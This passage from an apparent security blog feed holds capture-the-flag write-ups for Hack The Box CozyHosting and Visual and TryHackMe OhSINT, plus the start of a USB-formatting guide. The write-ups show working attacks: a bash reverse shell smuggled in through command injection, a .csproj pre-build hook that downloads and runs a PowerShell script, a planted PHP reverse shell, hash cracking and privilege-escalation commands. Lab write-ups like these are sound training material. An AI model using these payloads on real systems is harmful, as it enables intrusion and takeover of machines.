<p>We discover more directories, after testing all of them I find what looks like a cookie for the user <code>kanderson</code> in <code>/actuator/sessions</code>.</p>
<p><img src="/images/HTB-CozyHosting/cookie.png" alt="cozyhosting-cookie"></p>
<p>I go back to the login page and try to use it. I use some random values for <code>Username</code> and <code>Password</code> to generate a cookie. Then I replace my cookie value with the one I just found and refresh the page.</p>
<p>I now have access to the Dashboard of the user.</p>
<p><img src="/images/HTB-CozyHosting/Dashboard.png" alt="cozyhosting-dashboard"></p>
<p>There is another input field, it seems to be working with some SSH key files.</p>
<p><img src="/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png" alt="cozyhosting-SSH-note"></p>
<p>I use Burp Suite to capture the request. I try <code>cozyhosting:test</code> and I get that the <code>host key verification failed</code>. After I submit a <code>hostname</code> and <code>username</code> the form makes a request to the endpoint <code>/executessh</code>.</p>
<p><img src="/images/HTB-CozyHosting/host-key-verification-fail.png" alt="cozyhosting-host-key-failure"></p>
<p>I can also see in that the application is trying to execute some bash commands and I get an error created when <code>/bin/bash -c</code> is executed.</p>
<p><img src="/images/HTB-CozyHosting/binbash-error.png" alt="cozyhosting-bash-error"></p>
<h2 id="foothold">Foothold</h2>
<p>Now I know that some bash command is being executed I can try to get a reverse shell through this process.</p>
<p>I used this command to generate my payload in base64.</p>
<pre tabindex="0"><code>echo &#34;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&#34; | base64 -w 0
</code></pre><p><img src="/images/HTB-CozyHosting/payload-generated.png" alt="cozyhosting-payload"></p>
<p><strong>Setup a netcat listener before attempting to login.</strong></p>
<pre tabindex="0"><code>nc -nvlp &lt;YOUR-PORT-NUMBER&gt;
</code></pre><p>I try to login with <code>cozyhosting</code> as the hostname and for the username I use the command below (I am using my base64 payload generated earlier with the <code>echo</code> command).</p>
<pre tabindex="0"><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg==&#34;
</code></pre><p>I get a message saying that <code>Username can't contain whitespaces!</code>. I then use the bash parameter <code>{IFS%??}</code> to remove spaces from the payload.</p>
<pre tabindex="0"><code>;echo${IFS%??}&#34;&lt;your payload here&gt;&#34;${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
</code></pre><p>After using the new payload I get a reverse shell!</p>
<p><img src="/images/HTB-CozyHosting/rev-shell.png" alt="cozyhosting-reverse-shell"></p>
<p>We can make the shell stable with these commands</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
</code></pre><p><img src="/images/HTB-CozyHosting/stable-shell.png" alt="cozyhosting-stable-shell"></p>
<blockquote>
<p>Do not worry if you cannot see the prompt after running the last command, just press <code>Enter</code> and everything will come back.</p>
</blockquote>
<p>We find an archive on the target system, let&rsquo;s download it.</p>
<p>I set up a server on the target</p>
<pre tabindex="0"><code>python3 -m http.server 8000
</code></pre><p>On my attack machine I run</p>
<pre tabindex="0"><code>wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
</code></pre><p>Unzip the archive with</p>
<pre tabindex="0"><code>unzip cloudhosting-0.0.1.jar
</code></pre><p>I search through it with <code>grep -r password *</code> and I get some matches. I see that there is a password in <code>BOOT-INF/classes/application.properties</code>.</p>
<p><img src="/images/HTB-CozyHosting/password-location-springboot.png" alt="cozyhosting-password-in-archive"></p>
<p>I output the content of the file on the terminal and I get a username on top of the password for a PostgreSQL database.</p>
<p><img src="/images/HTB-CozyHosting/postgres-credentials.png" alt="cozyhosting-full-credentials"></p>
<p>We log in PostgreSQL with</p>
<pre tabindex="0"><code>psql -h 127.0.0.1 -U postgres
</code></pre><p>Then we connect to the database with</p>
<pre tabindex="0"><code>\c cozyhosting
</code></pre><p><img src="/images/HTB-CozyHosting/postgres-loggedin.png" alt="cozyhosting-db-login"></p>
<p>I then list the tables of the database with <code>\d</code>.</p>
<p><img src="/images/HTB-CozyHosting/db-tables.png" alt="cozyhosting-db-tables"></p>
<p>I then run <code>select * from users;</code>, with this command PostgreSQL will retrieve all rows and all columns from the &ldquo;users&rdquo; table and return them as a result set. This query is commonly used to view the contents of a table and can be very useful for inspecting the data stored in the database.</p>
<p>We find some hashes.</p>
<p><img src="/images/HTB-CozyHosting/db-hashes.png" alt="cozyhosting-db-hashes"></p>
<p>Let&rsquo;s what type of hash this is (of course we are interested in the admin hash we are already logged in as kanderson).</p>
<pre tabindex="0"><code>hashid &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; 
</code></pre><p><img src="/images/HTB-CozyHosting/hashid.png" alt="cozyhosting-hash-ID"></p>
<h2 id="lateral-movement">Lateral Movement</h2>
<p>Let&rsquo;s try to crack the hash. First I get it into a file.</p>
<pre tabindex="0"><code>echo &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; &gt; hash.txt
</code></pre><blockquote>
<p>If you don&rsquo;t want to use <code>John</code>, use this website <a href="https://hashes.com/en/decrypt/hash" target="_blank" >hashes.com</a>

</p>
</blockquote>
<pre tabindex="0"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre><p>I get the password <code>manchesterunited</code>.</p>
<p>Back on the reverse shell, I run <code>ls -la /home</code> and you I see another directory own by the user <code>josh</code>.</p>
<p><img src="/images/HTB-CozyHosting/home-listing.png" alt="cozyhosting-home-content"></p>
<p>I switch to the <code>josh</code> user with <code>su josh</code> with the password we just cracked. I check his home directory with  <code>cd $home</code> and find the flag <code>user.txt</code> there!</p>
<p><img src="/images/HTB-CozyHosting/userflag.png" alt="cozyhosting-user-flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>I use <code>sudo -l</code> to see what this user can run.</p>
<p><img src="/images/HTB-CozyHosting/sudo-l-josh.png" alt="cozyhosting-sudo-l"></p>
<p>I go to <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo" target="_blank" >GTFObins</a>

 to find some ssh root shells commands and I use</p>
<pre tabindex="0"><code>sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
</code></pre><p><img src="/images/HTB-CozyHosting/priv-escalation.png" alt="cozyhosting-privilege-escalation"></p>
<p>The shell is not optimal you can run this command to get a proper one</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>All you need to do now is <code>cd $home</code> and you will find the <code>root.txt</code> flag.</p>
<p><img src="/images/HTB-CozyHosting/rootflag-1.png" alt="cozyhosting-privilege-escalation"></p>
<p>Thanks for checking my writeup, feel free to comment or reach out to me on on X <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>

 if you have any questions.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Visual</title>
            <link>https://scorpiosec.com/posts/2024/02/htb-visual/</link>
            <pubDate>Sat, 24 Feb 2024 19:37:32 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/02/htb-visual/</guid>
            <description>Platform: Hack The Box Link: Visual Level: Medium OS: Windows This is a medium difficulty Windows machine with a web application accepting user submitted Git repositories URLs.
The target IP address is 10.10.11.234
My IP address is 10.10.14.222
Scanning sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 I run my usual scan and I get some information:
Apache web server is running on the target It is a Windows machine (Though you can see that on the machine page) A PHP application is hosted on the machine Starting Nmap 7.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Visual" target="_blank" >Visual</a>

</li>
<li>Level: Medium</li>
<li>OS: Windows</li>
</ul>
<hr>
<p>This is a medium difficulty Windows machine with a web application accepting user submitted Git repositories URLs.</p>
<p>The target IP address is <code>10.10.11.234</code></p>
<!-- raw HTML omitted -->
<p>My IP address is <code>10.10.14.222</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
</code></pre><p>I run my usual scan and I get some information:</p>
<ul>
<li>Apache web server is running on the target</li>
<li>It is a Windows machine (Though you can see that on the machine page)</li>
<li>A PHP application is hosted on the machine</li>
</ul>
<pre tabindex="0"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
Nmap scan report for 10.10.11.234
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>We get to the web application by visiting <code>http://10.10.11.234</code>. The application appears to be a service allowing users to submit a Git repo URL, it will then compile the .NET project from for the user.</p>
<p><img src="/images/HTB-Visual/Visual-webapp.png" alt="Visual Webapp"></p>
<p>I test the functionality by sending a custom URL, using the Python3.</p>
<pre tabindex="0"><code>python3 -m http.server
</code></pre><p>I then submit my link <code>http://10.10.14.222:8000</code> (Replace <code>10.10.14.222</code> by your IP address)</p>
<p><img src="/images/HTB-Visual/link-submit-Visual-1.png" alt="Link-submit1"></p>
<p>It redirects me to this page, where the application tries to compiles my project.
<img src="/images/HTB-Visual/Visual-build-attempt.png" alt="Build attempt"></p>
<p>Because there is no project at this URL the operation fails but I get some information. This application looks for a <code>.sln</code> file.</p>
<blockquote>
<p>A .sln file is a solution file used by Microsoft Visual Studio. The file serves as a container for one or more projects. It helps organize and manage related projects within a single workspace. The <code>.sln</code> file stores information about the projects contained within it, including their dependencies, build configurations, and references to external libraries or resources.</p>
</blockquote>
<p><img src="/images/HTB-Visual/Visual-build-failure.png" alt="Build failure"></p>
<p>I can see what I received from the application back on my server.</p>
<p><img src="/images/HTB-Visual/python3server-GET-method-1.png" alt="Get method server"></p>
<p>I see a code 404, because no file was found at my URL and <code>GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404</code>. It seems that the application is using the <code>git-upload-pack</code> service which is a part of the Git protocol used for operations like cloning or fetching changes from a remote repository. Read more about it <a href="https://git-scm.com/docs/git-upload-pack" target="_blank" >here</a>

.</p>
<p>From the application page we gather that our link must lead to a .NET 6.0 project with a <code>.sln</code> file.</p>
<p><img src="/images/HTB-Visual/Visual-dotnet-support.png" alt="Visual support"></p>
<h2 id="foothold">Foothold</h2>
<p>I never used .NET so I asked ChatGPT to show me how to create projects for it.</p>
<pre tabindex="0"><code>dotnet new sln -n visual
</code></pre><p>When you run the command <code>dotnet new sln -n visual</code>, it creates a new solution file named <code>visual.sln</code>.
<img src="/images/HTB-Visual/dotnet-new-sln.png" alt="Dotnet new sln"></p>
<pre tabindex="0"><code>dotnet new console -n visual
</code></pre><p>This command creates a new console application project named <code>visual</code>. This project will contain the necessary files and configurations for a basic console application written in C#.</p>
<p><img src="/images/HTB-Visual/dotnet-new-console.png" alt="Dotnet new console"></p>
<p>We add the <code>visual.csproj</code> project file located in the <code>visual</code> directory to the solution file (<code>visual.sln</code>).</p>
<pre tabindex="0"><code>dotnet sln add visual/visual.csproj
</code></pre><p><img src="/images/HTB-Visual/dotnet-sln-add.png" alt="Dotnet sln add"></p>
<blockquote>
<p>In .NET projects, a <code>.csproj</code> file is a project file that is used to define and configure the project. It is an XML-based file that contains metadata and settings about the project, such as its dependencies, build settings, target framework, and more.</p>
</blockquote>
<p><code>git init</code> is used to initialize a new Git repository.</p>
<pre tabindex="0"><code>git init
</code></pre><p><img src="/images/HTB-Visual/visual-git-init.png" alt="Visual git init"></p>
<p>We need to find a way to serve our Git repo to the application I found a great blog post about it here, <a href="https://theartofmachinery.com/2016/07/02/git_over_http.html" target="_blank" >A Quick and Hacky Way to Serve a Git Repo over HTTP</a>

.</p>
<p>We now run these commands</p>
<pre tabindex="0"><code>git add .
git commit -m &#34;Test&#34;
cd .git
git --bare update-server-info
cd ..
</code></pre><blockquote>
<p>We will have to run them every time we make any changes to our files.
When you run <code>git --bare update-server-info</code>, Git updates the auxiliary files necessary for serving the repository over the network.</p>
</blockquote>
<p>Run your python server again with <code>python3 -m http.server</code> and submit your URL now that we have the right files.</p>
<pre tabindex="0"><code>http://10.10.14.222:8000/.git
</code></pre><p><img src="/images/HTB-Visual/url-submission-visual1.png" alt="Visual link submit2"></p>
<!-- raw HTML omitted -->
<p>The building process is successful this time.</p>
<p><img src="/images/HTB-Visual/visual-building-successful.png" alt="Visual successful build"></p>
<p>Back on our server we get some successful GET requests.</p>
<p><img src="/images/HTB-Visual/server-good-requests.png" alt="Server good requests"></p>
<p>I can see that the application is compiling the files in the git repo. We need to find a way to exploit this process. After some googling, I found this <a href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022" target="_blank" >Microsoft page</a>

 explaining that a &ldquo;pre-build event&rdquo; refers to a script or command that is executed before the build process for the project begins.</p>
<p>We can use a <code>PreBuild</code> event in the <code>.csproj</code> file to execute some commands. So let&rsquo;s try to add a reverse shell.</p>
<ul>
<li>Below is my modified <code>.csproj</code> file</li>
</ul>
<pre tabindex="0"><code>&lt;Project Sdk=&#34;Microsoft.NET.Sdk&#34;&gt;

  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;/PropertyGroup&gt;

&lt;Target Name=&#34;PreBuild&#34; BeforeTargets=&#34;PreBuildEvent&#34;&gt;
    &lt;Exec Command=&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.222:8000/revshell.ps1&#39;)&#34; /&gt;
  &lt;/Target&gt;

&lt;/Project&gt;
</code></pre><ul>
<li>Let&rsquo;s create a <code>revshell.ps1</code> PowerShell script to get a remote shell. I used this <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1" target="_blank" >nishang shell</a>

 for the reverse shell. I took this <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" >shell</a>

, changed the function name and added the reverse switch at the end.</li>
</ul>
<p>I setup a netcat listener with</p>
<pre tabindex="0"><code>nc -nvlp 9001
</code></pre><p>We use the git commands again</p>
<pre tabindex="0"><code>git add .
git commit -m &#34;Add as a test&#34;
cd .git
git --bare update-server-info
cd ..
</code></pre><p>If you stopped your Python server start it again (and leave it running) and submit your link.</p>
<p>The listener should catch a shell after the compilation is done, we are in!</p>
<p><img src="/images/HTB-Visual/nc-listener-shell.png" alt="nc listener, reverse shell"></p>
<p>Running <code>whoami</code> I see that I&rsquo;m currently connected as the user <code>enox</code>.</p>
<p><img src="/images/HTB-Visual/target-whoami.png" alt="whoami command on target"></p>
<p>We can check our privileges with <code>whoami /priv</code>.
<img src="/images/HTB-Visual/target-priv.png" alt="privilege on target machine"></p>
<p>I go to the user main directory with <code>cd \Users\enox</code> and I use <code>ls</code> to see the different subdirectories.</p>
<p><img src="/images/HTB-Visual/target-directories.png" alt="directories listing on target"></p>
<p>I check the content of the <code>Desktop</code> directory with <code>dir Desktop</code> and I can see the <code>user.txt</code> flag. Use <code>cat user.txt</code> to check its content.</p>
<p><img src="/images/HTB-Visual/Visual-user-flag.png" alt="User flag"></p>
<h2 id="lateral-movement">Lateral Movement</h2>
<p>To find privilege escalation paths let&rsquo;s use <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023" target="_blank" >winPEAS</a>

 . Get <code>WinPEASany.exe</code> and store it in the repository that you are using for your python server.</p>
<p><img src="/images/HTB-Visual/winPEAS-location.png" alt="winPEAS location"></p>
<p>Get it to the target with <code>wget</code>.</p>
<pre tabindex="0"><code>wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
</code></pre><blockquote>
<p>Use your IP address and replace the port by the one you are using for your server</p>
</blockquote>
<p>Verify that the file is on the target.</p>
<p><img src="/images/HTB-Visual/winPEAS-on-target.png" alt="winPEAS location on target"></p>
<p>You can check the options of winPEAS with <code>./wpany.exe -h</code>.</p>
<p><img src="/images/HTB-Visual/winpeas-options.png" alt="winPEAS options"></p>
<p>Run it with the options you want, Because I want a somewhat thorough enumeration I am using this command</p>
<pre tabindex="0"><code>./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
</code></pre><p>It seems that we have permissions to the directory containing the Apache HTTP Server service.</p>
<p><img src="/images/HTB-Visual/ApacheServerHTTP.png" alt="Apache Server HTTP"></p>
<p>Going through the output you can notice that you have full access to the <code>xampp</code> directory (remember this is a PHP application), the same folder storing Apache.</p>
<p><img src="/images/HTB-Visual/xampp-permissions.png" alt="xampp directory"></p>
<p>We can attempt to learn more about <code>ApacheHTTPServer</code> with</p>
<pre tabindex="0"><code>Get-CIMInstance -Class Win32_Service -Filter &#34;Name=&#39;ApacheHTTPServer&#39;&#34; | Select-Object *
</code></pre><p>This is the output we get, it seems like it runs under <code>NT AUTHORITY\Local Service</code>.</p>
<p><img src="/images/HTB-Visual/AppacheHTTPServer-info-1.png" alt="Apache HTTP Server service info"></p>
<blockquote>
<p>&ldquo;On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user <code>NT AUTHORITY\LOCAL SERVICE</code>&hellip;&rdquo;. Basically we can achieve privilege escalation via this account. Read more about it <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >here</a>

.</p>
</blockquote>
<p>The service runs under <code>NT AUTHORITY\Local Service</code> so we need to escalate to that account. Since we have access to the <code>xampp</code> directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.</p>
<blockquote>
<p>In PHP applications, the XAMPP folder serves as the root directory for hosting web files (such as HTML, PHP, CSS, JavaScript, images, etc.) and managing server configuration settings.</p>
</blockquote>
<pre tabindex="0"><code>cd C:\Xampp\
ls
</code></pre><p><img src="/images/HTB-Visual/xampp-content-1.png" alt="xampp directory content"></p>
<p>Notice the <code>htdocs</code> folder.</p>
<blockquote>
<p>In XAMPP, the <code>htdocs</code> directory serves as the default web server document root. This means that any files placed within the <code>htdocs</code> directory will be accessible through a web browser when the XAMPP server is running.</p>
</blockquote>
<p>The application files are here as you can see. We can put a PHP reverse shell in the <code>htdocs</code> directory.</p>
<p><img src="/images/HTB-Visual/xampp-htdocs.png" alt="xampp htdocs directory"></p>
<p>This is the <a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" target="_blank" >PHP reverse shell</a>

 I used.</p>
<p>I then run <code>wget http://10.10.14.222:8000/revshell.php -o rev.php</code> to get it to the target.</p>
<p><img src="/images/HTB-Visual/php-reverse-shell-1.png" alt="PHP reverse shell on the target"></p>
<p>Let&rsquo;s setup a netcat listener with</p>
<pre tabindex="0"><code>nc -nvlp 8010
</code></pre><blockquote>
<p>Use the port number that you specified in the PHP reverse shell.</p>
</blockquote>
<p>Go back to the browser and go to <code>http://&lt;target IP address&gt;/rev.php</code>, come back to your listener and you should have a shell with the user <code>nt authority\local service</code>.</p>
<p><img src="/images/HTB-Visual/nt-authority-local-service.png" alt="nt authority user shell on the target"></p>
<p>Check your privileges and you notice that you lack the <code>ImpersonatePrivilege</code> needed to get administrative privileges.</p>
<p>Let&rsquo;s run <code>whoami /priv</code>.</p>
<p><img src="/images/HTB-Visual/nt-authority-priv.png" alt="nt authority user privileges"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>This <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >blog</a>

 post gives you the link to a tool used to obtain more privileges. The tool is called <a href="https://github.com/itm4n/FullPowers" target="_blank" >FullPowers</a>

. Get it on the target machine (Make sure to use the reverse shell with <code>nt authority\local service</code>).</p>
<blockquote>
<p>We do not want the executable to be accessible through the browser so we <code>cd ..</code> back to the <code>xampp</code> directory before downloading our file.</p>
</blockquote>
<pre tabindex="0"><code>wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
</code></pre><p>I get an error because we currently have a cmd shell and not a PowerShell one.</p>
<p><img src="/images/HTB-Visual/shell-error-1.png" alt="nt authority user shell error"></p>
<p>Just run <code>powershell</code> and rerun the <code>wget</code> command.</p>
<p><img src="/images/HTB-Visual/powershell-fullpowers-dl.png" alt="nt authority FullPowers dlownload"></p>
<p>Now we execute <code>fp.exe</code> and we get new privileges! Notice that it downgraded us again to a cmd shell and it also forced us out of the <code>xampp</code> folder, so we need to run <code>powershell</code> and <code>cd C:\xampp</code>.</p>
<p><img src="/images/HTB-Visual/nt-authority-new-priv.png" alt="nt authority user new privileges"></p>
<p>Now we can use <a href="https://github.com/wh0amitz/PetitPotato" target="_blank" >PetitPotato</a>

 to achieve privilege escalation by abusing impersonate privileges.</p>
<p>We get it to the target by running</p>
<pre tabindex="0"><code>wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
</code></pre><p>However we get an error</p>
<pre tabindex="0"><code>wget : Win32 internal error &#34;Access is denied&#34; 0x5 occurred while reading the console output buffer. Contact Microsoft 
</code></pre><p>It seems that this error is caused by the progress bar displayed on the terminal. It can be solved by running <code>$ProgressPreference = &quot;SilentlyContinue&quot;</code> before the <code>wget</code> command.</p>
<p>We can now use our file by running</p>
<pre tabindex="0"><code>./pp.exe 3 cmd
</code></pre><p><img src="/images/HTB-Visual/PetitPotato-exploit.png" alt="PetitPotato exploit"></p>
<p>We now have admin privileges, let&rsquo;s check.</p>
<pre tabindex="0"><code>cd C:\Users\Administrator\Desktop
</code></pre><p>Then let&rsquo;s list the content of the directory, we got downgraded to a cmd shell again so we have to use <code>dir</code>.</p>
<p><img src="/images/HTB-Visual/root-flag.png" alt="root flag"></p>
<p>We find the <code>root.txt</code>! Use <code>type root.txt</code> to see it.</p>
<p>That&rsquo;s it for my first Hack The Box writeup! I hope it was helpful. If you have any questions leave a comment or reach me on X <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>THM: OhSINT</title>
            <link>https://scorpiosec.com/posts/2024/02/thm-ohsint/</link>
            <pubDate>Tue, 13 Feb 2024 14:31:59 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/02/thm-ohsint/</guid>
            <description>Platform: TryHackMe Link: OhSINT Level: Easy Type: OSINT This is an OSINT challenge, OSINT stands for Open-Source Intelligence. It&amp;rsquo;s essentially the collection and analysis of publicly available information to gain valuable insights. Think of it like putting together a puzzle using pieces you find scattered around the internet, libraries, or anywhere information is freely accessible.
After downloading the Task Files, with the Download Task Files button you get a single image named WindowsXP.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: TryHackMe</li>
<li>Link: <a href="https://tryhackme.com/room/ohsint" target="_blank" >OhSINT</a>

</li>
<li>Level: Easy</li>
<li>Type: OSINT</li>
</ul>
<hr>
<p>This is an OSINT challenge, OSINT stands for Open-Source Intelligence. It&rsquo;s essentially the collection and analysis of publicly available information to gain valuable insights. Think of it like putting together a puzzle using pieces you find scattered around the internet, libraries, or anywhere information is freely accessible.</p>
<p>After downloading the Task Files, with the <code>Download Task Files</code> button you get a single image named <code>WindowsXP.jpg</code>. As you can see, you cannot get anything from this picture at first glance.</p>
<p><img src="/images/THM-OhSINT/WindowsXP.jpg" alt="WindowsXP backgroung image"></p>
<h2 id="1-what-is-this-users-avatar-of">1. What is this user&rsquo;s avatar of?</h2>
<blockquote>
<p>Imagine you have a collection of photos from your recent vacation. The photos themselves capture the memories, but there&rsquo;s more you might want to know about them: when were they taken, where, by whom? This &ldquo;extra&rdquo; information that describes the photos themselves is called metadata. In short metadata is data that provides information about other data.</p>
</blockquote>
<p>On Linux, we can use the <code>exiftool</code> to read the image metadata. Run the command <code>exiftool WindowsXP.jpg</code> and you will get some output.</p>
<p><img src="/images/THM-OhSINT/exiftool-cmd-result.png" alt="Output of exiftool command"></p>
<p>We get some useful information and a nickname for the Copyright, <code>OWoodflint</code>. This room being a OSINT case we look for publicly available information.</p>
<p>Googling <code>OWoodflint</code> get us multiple links, let&rsquo;s look at the X (formerly Twitter) account first.</p>
<p><img src="/images/THM-OhSINT/OWoodflint-search-results.png" alt="Search results of googling OWoodflint"></p>
<p>We see a cat as the profile picture, we try <code>cat</code> as the answer of the first question and it is the correct answer.</p>
<h2 id="2-what-city-is-this-person-in">2. What city is this person in?</h2>
<p>The hint tells us to use the BSSID found on X on a site called <code>Wigle.net</code>.</p>
<p><img src="/images/THM-OhSINT/OWoodflint-BSSID.png" alt="BSSID found on X account"></p>
<p>In his second post the user gave us a BSSID of <code>B4:5D:50:AA:86:41</code>. Now we go on <a href="https://www.wigle.net/" target="_blank" >wigle.net</a>

 and use that BSSID.</p>
<blockquote>
<p>A BSSID (<strong>Basic Service Set Identifier</strong>) is a unique identifier assigned to each wireless access point (AP) or router in a Wi-Fi network. It distinguishes one wireless network from another within a given coverage area. Essentially, the BSSID serves as the MAC (Media Access Control) address of the wireless device.</p>
</blockquote>
<p>Enter the BSSID and click on the <code>Filter</code> button below.</p>
<p><img src="/images/THM-OhSINT/Wigle-BSSID-search.png" alt="BSSID search on wigle.net"></p>
<p>You will have to zoom out and look for a purple circle on the map. The match shows <code>London</code>. This turns out to be the correct answer for the second question.</p>
<p><img src="/images/THM-OhSINT/BSSID-location-match.png" alt="BSSID search result"></p>
<h2 id="3-what-is-the-ssid-of-the-wap-he-connected-to">3. What is the SSID of the WAP he connected to?</h2>
<blockquote>
<p>An SSID, which stands for <strong>Service Set Identifier</strong>, is essentially the name of a Wi-Fi network. It&rsquo;s the public identifier that a wireless router broadcasts to announce its presence and allow nearby devices to connect.</p>
</blockquote>
<p>Keep zooming in on the location marked on the map and you will see the word <code>UnileverWiFi</code> above the BSSID you entered earlier, which is the correct answer for this question.</p>
<p><img src="/images/THM-OhSINT/OhSINT-WAP-SSID.png" alt="WAP SSID"></p>
<h2 id="4-what-is-his-personal-email-address">4. What is his personal email address?</h2>
<p>The second search result is a Github account, let&rsquo;s look there. We find an email address <code>OWoodflint@gmail.com</code>.</p>
<p><img src="/images/THM-OhSINT/OhSINT-email.png" alt="Email address found on Github"></p>
<h2 id="5-what-site-did-you-find-his-email-address-on">5. What site did you find his email address on?</h2>
<p>We found the email address on <code>Github</code>.</p>
<h2 id="6-where-has-he-gone-on-holiday">6. Where has he gone on holiday?</h2>
<p>We see a WordPress website on the Github repository.</p>
<p><img src="/images/THM-OhSINT/OhSINT-WordPress-site.png" alt="WordPress site url"></p>
<p>On the WordPress site the user revealed his location, saying that he is in <code>New York</code>, which is the correct answer.</p>
<p><img src="/images/THM-OhSINT/OhSINT-holiday-location-1.png" alt="Target holiday location"></p>
<h2 id="7-what-is-the-persons-password">7. What is the person&rsquo;s password?</h2>
<p>I recently learned about sensitive data exposure and how sometimes you will find sensitive data in the source code of web pages. Looking at the source code, we find a string written in white (<code>#ffffff</code> is the Hex color code for the white color). The author of this web page attempted to hide this string by writing it in white on a white background, essentially making it invisible. We try <code>pennYDr0pper.!</code> as the password and gets it right.</p>
<p><img src="/images/THM-OhSINT/OhSINT-password.png" alt="user password in source code"></p>
<blockquote>
<p>I think when it comes to OSINT challenges one should be very attentive and nothing should be overlooked. The password was just in front of me but I didn&rsquo;t pick up on it at first. I accidentally pressed <code>Ctrl+a</code> and the string <code>pennYDr0pper.!</code> became visible but I failed to notice that it was not visible before.</p>
</blockquote>
<p><img src="/images/THM-OhSINT/WP-password-trick.png" alt="Target holiday location"></p>
<p>That&rsquo;s it for my first writeup! I will try to tackle different types of hacking challenges to keep them interesting. Until next time.</p>
]]></content>
        </item>
        
        <item>
            <title>From Bootable to Usable: A Guide to Restoring Your USB Drive for Everyday Use</title>
            <link>https://scorpiosec.com/posts/2024/02/from-bootable-to-usable-a-guide-to-restoring-your-usb-drive-for-everyday-use/</link>
            <pubDate>Fri, 09 Feb 2024 14:55:37 -0600</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/02/from-bootable-to-usable-a-guide-to-restoring-your-usb-drive-for-everyday-use/</guid>
            <description>Introduction After turning a USB stick into a bootable USB drive, you may find it unusable for normal purposes, such as transferring data. I initially believed that simply deleting all the files on the USB stick would return it to its regular functionality. After searching online for a guide to revert the USB stick, I couldn&amp;rsquo;t find a satisfactory solution (perhaps my research skills weren&amp;rsquo;t up to par). Therefore, I took it upon myself to create a comprehensive guide.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>After turning a USB stick into a bootable USB drive, you may find it unusable for normal purposes, such as transferring data. I initially believed that simply deleting all the files on the USB stick would return it to its regular functionality. After searching online for a guide to revert the USB stick, I couldn&rsquo;t find a satisfactory solution (perhaps my research skills weren&rsquo;t up to par). Therefore, I took it upon myself to create a comprehensive guide. In this blog post, I&rsquo;ll demonstrate how to &ldquo;revive&rdquo; your USB stick, whether you&rsquo;re using Linux or Windows.</p>
<h2 id="linux-method">Linux Method</h2>
<p>To use the USB stick as a normal storage device again, you&rsquo;ll need to format it, which will erase all existing data. On Linux we can use GParted for the formatting.</p>
<p><strong>1. Start by launching gparted (if not installed, you can install it with <code>sudo apt install gparted</code>):</strong></p>
<pre tabindex="0"><code>sudo gparted
